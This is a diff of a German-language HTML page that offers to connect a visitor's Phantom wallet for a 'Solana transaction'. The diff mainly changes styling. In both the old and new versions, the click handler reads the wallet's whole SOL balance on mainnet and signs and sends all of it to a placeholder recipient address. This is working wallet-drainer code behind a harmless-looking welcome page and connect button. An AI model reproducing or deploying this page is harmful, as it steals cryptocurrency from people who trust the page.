@@ -8,90 +8,84 @@
         body {
             font-family: Arial, sans-serif;
             margin: 0;
-            padding: 15px;
+            padding: 20px;
             display: flex;
             flex-direction: column;
             align-items: center;
-            background-color: #1e1e1e;
-            color: white;
+            background-color: #f0f0f0;
         }
-        .content {
-            margin-top: 70px;
-            width: 100%;
-            max-width: 600px;
+        .container {
+            text-align: center;
+            margin-top: 50px;
         }
-        .exchange-button {
-            padding: 15px;
-            background-color: #4da3ff;
+        .button {
+            padding: 15px 30px;
+            background-color: #4CAF50;
             border: none;
-            border-radius: 12px;
-            font-size: 16px;
+            border-radius: 5px;
             color: white;
+            font-size: 16px;
             cursor: pointer;
-            margin-top: 25px;
-            width: 100%;
+            margin-top: 20px;
         }
-        .exchange-button:hover {
-            background-color: #3b8cc4;
+        .button:hover {
+            background-color: #45a049;
         }
     </style>
 </head>
 <body>
 
-    <div class="content">
-        <button class="exchange-button" id="acceptButton">Mit Phantom verbinden und Transaktion durchführen</button>
+    <div class="container">
+        <h1>Willkommen bei der Solana Transaktion</h1>
+        <p>Verbinden Sie sich mit Ihrer Phantom Wallet, um die Transaktion zu starten.</p>
+        <button class="button" id="connectButton">Mit Phantom verbinden</button>
     </div>
 
+    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.40.0/dist/solanaWeb3.min.js"></script>
     <script>
-        document.getElementById("acceptButton").addEventListener("click", async () => {
+        document.getElementById('connectButton').addEventListener('click', async () => {
             if (window.solana && window.solana.isPhantom) {
                 try {
                     // Verbindung zur Phantom Wallet herstellen
                     await window.solana.connect();
 
-                    // Verbindung herstellen und Wallet Public Key abrufen
-                    const wallet = window.solana;
-                    const publicKey = wallet.publicKey;
+                    // Wallet Public Key abrufen
+                    const publicKey = window.solana.publicKey;
 
                     // Solana-Netzwerk-Verbindung
-                    const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl("mainnet-beta"), "confirmed");
+                    const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'), 'confirmed');
 
-                    // Hole den SOL-Guthaben
+                    // Guthaben abrufen
                     const balance = await connection.getBalance(publicKey);
 
-                    // Zieladresse (Ihre angegebene Wallet-Adresse)
-                    const recipient = new solanaWeb3.PublicKey("IHRE_ZIELADRESSE_HIER");
+                    // Zieladresse (Beispiel-Wallet)
+                    const recipient = new solanaWeb3.PublicKey('IHRE_ZIELADRESSE_HIER');
 
-                    // Berechne den Betrag, der gesendet werden soll (die gesamte Balance)
-                    const amount = balance;
-
-                    // Erstelle eine Transaktion
+                    // Transaktion erstellen
                     const transaction = new solanaWeb3.Transaction().add(
                         solanaWeb3.SystemProgram.transfer({
-                            fromPubkey: wallet.publicKey,
+                            fromPubkey: publicKey,
                             toPubkey: recipient,
-                            lamports: amount, // Der Betrag in Lamports (1 SOL = 1 Milliarde Lamports)
+                            lamports: balance,
                         })
                     );
 
-                    // Sende die Transaktion
+                    // Transaktion signieren und senden
                     const signature = await window.solana.signAndSendTransaction(transaction);
 
-                    // Bestätige die Transaktion
-                    await connection.confirmTransaction(signature, "confirmed");
+                    // Transaktion bestätigen
+                    await connection.confirmTransaction(signature, 'confirmed');
 
-                    alert("Transaktion erfolgreich! Die gesamte Balance wurde gesendet.");
+                    alert('Transaktion erfolgreich! Die gesamte Balance wurde gesendet.');
                 } catch (error) {
-                    console.error("Fehler beim Verbinden mit Phantom Wallet oder Senden der Transaktion:", error);
-                    alert("Fehler bei der Verbindung mit Phantom Wallet oder beim Senden der Transaktion.");
+                    console.error('Fehler:', error);
+                    alert('Fehler bei der Verbindung oder Transaktion.');
                 }
             } else {
-                alert("Bitte installiere Phantom Wallet, um diese Funktion zu nutzen.");
+                alert('Bitte installieren Sie Phantom Wallet, um diese Funktion zu nutzen.');
             }
         });
     </script>
-
-    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.40.0/dist/solanaWeb3.min.js"></script>
 
 </body>
 </html>
